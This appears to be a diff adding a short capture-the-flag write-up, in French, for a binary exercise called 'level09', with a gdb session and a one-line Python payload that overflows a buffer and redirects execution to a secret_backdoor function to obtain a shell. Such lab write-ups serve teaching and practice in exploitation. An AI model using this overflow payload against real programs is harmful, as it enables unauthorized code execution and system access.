@@ -1,0 +1,30 @@
+secret backdoor addr = 0x000055555555488c
+
+gdb-peda$ r <<< $(python -c 'print("\xcc" * 41 + "a" * 286 +  "\x8c\x48\x55\x55\x55\x55")')
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
+>>: >: Msg sent!
+[New process 1987]
+process 1987 is executing new program: /bin/dash
+sh: 1: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: not found
+[Inferior 2 (process 1987) exited with code 0177]
+Warning: not running or target is remote
+
+
+
+
+
+(python -c 'print("\xcc" * 41 + "a" * 286 +  "\x8c\x48\x55\x55\x55\x55")'; cat) | env a=a ./level09
+
+
+Tres simple overflow.
+
+On remplie le buffer pour chercher un segfault.
+
+Une fois trouver on remplie le reste de 0x61. On vois sous gdb qu'on ecris dans EIP
+une fois qu'on est sur l'endroit ou commence le remplissage, on ecrase le reste par 
+l'adresse de la fonction secret_backdoor
